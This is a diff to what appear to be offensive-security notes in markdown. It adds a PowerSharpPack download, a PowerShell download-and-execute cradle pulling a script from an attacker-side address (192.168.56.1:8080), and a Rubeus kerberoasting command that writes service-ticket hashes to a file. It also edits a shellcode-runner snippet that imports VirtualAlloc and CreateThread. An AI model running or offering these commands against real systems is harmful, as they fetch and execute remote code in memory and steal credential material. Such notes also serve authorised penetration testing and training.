@@ -122,12 +122,19 @@ $out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($s
 
 ```
 
+- If instead of dealing with executables we'd just like to use powershell, we can use [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)
+    - `iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpPack.ps1 -o psp.ps1`
+    - Insanely useful powershell script that has C# executables bundled into it as compiled base64 binaries
+    - Run with `iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1')` and `PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"`, for example
+
 # Import VirtualAlloc to allocate memory
+
+```
 $code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-# Import CreateThreat to create execution threads
+# Import CreateThread to create execution threads
 [DllImport("kernel32.dll")]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
